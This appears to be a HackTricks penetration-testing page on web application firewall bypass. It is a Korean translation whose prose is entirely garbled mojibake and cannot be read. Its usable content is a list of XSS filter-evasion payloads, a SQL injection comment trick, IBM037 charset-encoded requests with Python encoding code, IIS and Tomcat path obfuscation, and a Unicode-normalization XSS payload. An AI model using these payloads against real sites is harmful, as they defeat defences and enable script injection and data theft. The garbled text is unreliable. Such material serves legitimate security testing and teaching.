# WAF ìš°íšŒ

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**ë¥¼** **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **HackTricks**ì™€ **HackTricks Cloud** github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ **í•˜ì„¸ìš”.

</details>

## ì •ê·œì‹ ìš°íšŒ

ë‹¤ì–‘í•œ ê¸°ë²•ì„ ì‚¬ìš©í•˜ì—¬ ë°©í™”ë²½ì˜ ì •ê·œì‹ í•„í„°ë¥¼ ìš°íšŒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ëŒ€ì†Œë¬¸ì êµëŒ€, ì¤„ ë°”ê¿ˆ ì¶”ê°€, í˜ì´ë¡œë“œ ì¸ì½”ë”© ë“±ì˜ ì˜ˆê°€ ìˆìŠµë‹ˆë‹¤. ë‹¤ì–‘í•œ ìš°íšŒ ê¸°ë²•ì— ëŒ€í•œ ìë£ŒëŠ” [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#filter-bypass-and-exotic-payloads)ì™€ [OWASP](https://cheatsheetseries.owasp.org/cheatsheets/XSS\_Filter\_Evasion\_Cheat\_Sheet.html)ì—ì„œ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì•„ë˜ ì˜ˆì‹œëŠ” [ì´ ê¸°ì‚¬](https://medium.com/@allypetitt/5-ways-i-bypassed-your-web-application-firewall-waf-43852a43a1c2)ì—ì„œ ê°€ì ¸ì™”ìŠµë‹ˆë‹¤.
```bash
<sCrIpT>alert(XSS)</sCriPt> #changing the case of the tag
<<script>alert(XSS)</script> #prepending an additional "<"
<script>alert(XSS) // #removing the closing tag
<script>alert`XSS`</script> #using backticks instead of parenetheses
java%0ascript:alert(1) #using encoded newline characters
<iframe src=http://malicous.com < #double open angle brackets
<STYLE>.classname{background-image:url("javascript:alert(XSS)");}</STYLE> #uncommon tags
<img/src=1/onerror=alert(0)> #bypass space filter by using / where a space is expected
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaaa href=javascript:alert(1)>xss</a> #extra characters
Function("ale"+"rt(1)")(); #using uncommon functions besides alert, console.log, and prompt
javascript:74163166147401571561541571411447514115414516216450615176 #octal encoding
<iframe src="javascript:alert(`xss`)"> #unicode encoding
/?id=1+un/**/ion+sel/**/ect+1,2,3-- #using comments in SQL query to break up statement
new Function`alt\`6\``; #using backticks instead of parentheses
data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+ #base64 encoding the javascript
%26%2397;lert(1) #using HTML encoding
<a src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aconfirm(XSS)"> #Using Line Feed (LF) line breaks
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=confirm()> # use any chars that aren't letters, numbers, or encapsulation chars between event handler and equal sign (only works on Gecko engine)
```
## ë¬¸ì ì§‘í•© ì¸ì½”ë”©

WAFëŠ” ì›¹ ì‘ìš© í”„ë¡œê·¸ë¨ ë°©í™”ë²½ì„ ì˜ë¯¸í•˜ë©°, ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ì˜ ë³´ì•ˆì„ ê°•í™”í•˜ê¸° ìœ„í•´ ì‚¬ìš©ë©ë‹ˆë‹¤. WAFëŠ” ì¼ë°˜ì ìœ¼ë¡œ ì›¹ ìš”ì²­ì„ ë¶„ì„í•˜ê³ , ì•…ì„± í–‰ìœ„ë¥¼ íƒì§€í•˜ê³  ì°¨ë‹¨í•˜ëŠ” ë° ì‚¬ìš©ë©ë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ WAFëŠ” ì¢…ì¢… ë¬¸ì ì§‘í•© ì¸ì½”ë”©ì„ ì‚¬ìš©í•˜ì—¬ ì•…ì„± í˜ì´ë¡œë“œë¥¼ íƒì§€í•˜ê³  ì°¨ë‹¨í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ë¬¸ì ì§‘í•© ì¸ì½”ë”©ì€ ë¬¸ìë¥¼ ì»´í“¨í„°ì—ì„œ ì‚¬ìš©í•  ìˆ˜ ìˆëŠ” í˜•ì‹ìœ¼ë¡œ ë³€í™˜í•˜ëŠ” í”„ë¡œì„¸ìŠ¤ì…ë‹ˆë‹¤. ì¼ë¶€ WAFëŠ” íŠ¹ì • ë¬¸ì ì§‘í•©ì„ ì°¨ë‹¨í•˜ê±°ë‚˜ í—ˆìš©í•˜ëŠ” ë° ì‚¬ìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ë¥¼ í†µí•´ WAFëŠ” ì•…ì„± í˜ì´ë¡œë“œë¥¼ íƒì§€í•˜ê³  ì°¨ë‹¨í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

WAF ìš°íšŒë¥¼ ìœ„í•´ ë¬¸ì ì§‘í•© ì¸ì½”ë”©ì„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ë¥¼ í†µí•´ ì•…ì„± í˜ì´ë¡œë“œë¥¼ ë³€í˜•í•˜ì—¬ WAFì˜ íƒì§€ë¥¼ í”¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì¼ë°˜ì ìœ¼ë¡œ URL ì¸ì½”ë”©, ìœ ë‹ˆì½”ë“œ ì¸ì½”ë”©, HTML ì—”í‹°í‹° ì¸ì½”ë”© ë“±ì´ ì‚¬ìš©ë©ë‹ˆë‹¤.

ë¬¸ì ì§‘í•© ì¸ì½”ë”©ì€ WAF ìš°íšŒ ê¸°ìˆ  ì¤‘ í•˜ë‚˜ì´ë©°, íŠ¹ì • WAF êµ¬í˜„ì— ë”°ë¼ íš¨ê³¼ì ì¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ ëª¨ë“  WAFì—ì„œ ë™ì‘í•˜ì§€ëŠ” ì•Šìœ¼ë©°, WAF ìš°íšŒë¥¼ ìœ„í•´ ë‹¤ë¥¸ ê¸°ìˆ ê³¼ ì¡°í•©í•˜ì—¬ ì‚¬ìš©í•˜ëŠ” ê²ƒì´ ì¢‹ìŠµë‹ˆë‹¤.
```bash
# Charset encoding
application/x-www-form-urlencoded;charset=ibm037
multipart/form-data; charset=ibm037,boundary=blah
multipart/form-data; boundary=blah; charset=ibm037

##Python code
import urllib
s = 'payload'
print(urllib.parse.quote_plus(s.encode("IBM037")))

## Request example
GET / HTTP/1.1
Host: buggy
Content-Type: application/x-www-form-urlencoded; charset=ibm500
Content-Length: 61

%86%89%93%85%95%81%94%85=KKaKKa%C6%D3%C1%C7K%A3%A7%A3&x=L%A7n
```
## ë‚œë…í™”

Obfuscation(ë‚œë…í™”)ì€ ì›¹ ì‘ìš© í”„ë¡œê·¸ë¨ì—ì„œ ì‚¬ìš©ë˜ëŠ” ì¼ë°˜ì ì¸ WAF(Web Application Firewall) ìš°íšŒ ê¸°ìˆ  ì¤‘ í•˜ë‚˜ì…ë‹ˆë‹¤. ì´ ê¸°ìˆ ì€ ê³µê²©ìê°€ ê³µê²© ì½”ë“œë¥¼ ê°ì§€ ë° ì°¨ë‹¨í•˜ëŠ” WAFë¥¼ ìš°íšŒí•˜ê¸° ìœ„í•´ ì½”ë“œë¥¼ ë³€í˜•ì‹œí‚¤ëŠ” ê²ƒì„ ëª©í‘œë¡œ í•©ë‹ˆë‹¤.

ë‚œë…í™”ëŠ” ë‹¤ì–‘í•œ ë°©ë²•ìœ¼ë¡œ ìˆ˜í–‰ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì¼ë°˜ì ì¸ ê¸°ìˆ ë¡œëŠ” ë³€ìˆ˜ ë° í•¨ìˆ˜ ì´ë¦„ì˜ ë³€ê²½, ì½”ë“œì˜ ì¬ì •ë ¬, ë¶ˆí•„ìš”í•œ ê³µë°± ë° ì£¼ì„ ì œê±° ë“±ì´ ìˆìŠµë‹ˆë‹¤. ì´ëŸ¬í•œ ë³€í˜•ì€ ì½”ë“œë¥¼ ì½ê¸° ì–´ë µê²Œ ë§Œë“¤ì–´ WAFê°€ ê³µê²© ì½”ë“œë¥¼ ê°ì§€í•˜ê¸° ì–´ë µê²Œ í•©ë‹ˆë‹¤.

ë‚œë…í™”ëŠ” ì£¼ë¡œ JavaScript ì½”ë“œì—ì„œ ì‚¬ìš©ë˜ë©°, ì£¼ë¡œ ì›¹ ì‘ìš© í”„ë¡œê·¸ë¨ì—ì„œ ì‚¬ìš©ë˜ëŠ” í´ë¼ì´ì–¸íŠ¸ ì¸¡ ìŠ¤í¬ë¦½íŠ¸ì— ì ìš©ë©ë‹ˆë‹¤. ì´ë¥¼ í†µí•´ ê³µê²©ìëŠ” WAFë¥¼ ìš°íšŒí•˜ê³  ì•…ì„± ì½”ë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ë‚œë…í™”ëŠ” WAF ìš°íšŒë¥¼ ìœ„í•œ íš¨ê³¼ì ì¸ ê¸°ìˆ  ì¤‘ í•˜ë‚˜ì´ì§€ë§Œ, ì™„ë²½í•œ ë³´ì•ˆì„ ì œê³µí•˜ì§€ëŠ” ì•ŠìŠµë‹ˆë‹¤. ê³ ê¸‰ WAFëŠ” ë‚œë…í™”ëœ ì½”ë“œë¥¼ ë¶„ì„í•˜ê³  ê°ì§€í•  ìˆ˜ ìˆì„ ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤. ë”°ë¼ì„œ ê³µê²©ìëŠ” ë‹¤ë¥¸ ìš°íšŒ ê¸°ìˆ ê³¼ í•¨ê»˜ ë‚œë…í™”ë¥¼ ì‚¬ìš©í•˜ëŠ” ê²ƒì´ ì¢‹ìŠµë‹ˆë‹¤.
```bash
# IIS, ASP Clasic
<%s%cr%u0131pt> == <script>

# Path blacklist bypass - Tomcat
/path1/path2/ == ;/path1;foo/path2;bar/;
```
## ìœ ë‹ˆì½”ë“œ í˜¸í™˜ì„±

ìœ ë‹ˆì½”ë“œ ì •ê·œí™”ì˜ êµ¬í˜„ì— ë”°ë¼ (ìì„¸í•œ ë‚´ìš©ì€ [ì—¬ê¸°](https://jlajara.gitlab.io/Bypass\_WAF\_Unicode)ì—ì„œ í™•ì¸ ê°€ëŠ¥), ìœ ë‹ˆì½”ë“œ í˜¸í™˜ì„±ì„ ê³µìœ í•˜ëŠ” ë¬¸ìëŠ” WAFë¥¼ ìš°íšŒí•˜ê³  ì˜ë„í•œ í˜ì´ë¡œë“œë¡œ ì‹¤í–‰ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤. í˜¸í™˜ ê°€ëŠ¥í•œ ë¬¸ìëŠ” [ì—¬ê¸°](https://www.compart.com/en/unicode)ì—ì„œ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### ì˜ˆì œ
```bash
# under the NFKD normalization algorithm, the characters on the left translate
# to the XSS payload on the right
ï¼œimg srcâ¼p onerrorâ¼ï¼‡promptâ½1â¾ï¼‡ï¹¥  --> ï¼œimg src=p onerror='prompt(1)'>
```
## í¬ê¸° ì œí•œ ì´ˆê³¼

í´ë¼ìš°ë“œ ê¸°ë°˜ WAFì—ì„œëŠ” í˜ì´ë¡œë“œê°€ X í¬ê¸°ë³´ë‹¤ í° ê²½ìš°, ìš”ì²­ì´ WAFì— ì˜í•´ í™•ì¸ë˜ì§€ ì•Šì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ë¥¼ ì´ìš©í•˜ì—¬ ê°„ë‹¨íˆ ìš°íšŒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### IP íšŒì „

* [https://github.com/rootcathacking/catspin](https://github.com/rootcathacking/catspin)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)ì„ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **HackTricks**ì™€ **HackTricks Cloud** github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ ì—¬ëŸ¬ë¶„ì˜ í•´í‚¹ ê¸°êµë¥¼ ê³µìœ í•˜ì„¸ìš”.

</details>
